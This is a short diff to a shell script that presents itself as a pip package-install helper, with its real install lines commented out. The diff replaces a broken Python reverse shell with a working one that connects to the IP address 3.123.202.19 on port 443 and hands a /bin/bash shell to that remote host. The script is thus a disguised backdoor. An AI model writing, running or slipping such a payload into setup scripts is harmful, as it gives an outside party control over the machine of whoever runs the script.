@@ -4,7 +4,7 @@ set -e
 # Install specific package versions with pip
 # Check the latest version using https://pypi.org/search
 
-python3 -c 'import socket.subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.123.202.19", 443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.123.202.19",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 # pip3 install pandas==0.23.3
 # pip3 install matplotlib==2.2.2
 # pip3 install scikit-learn==0.19.2
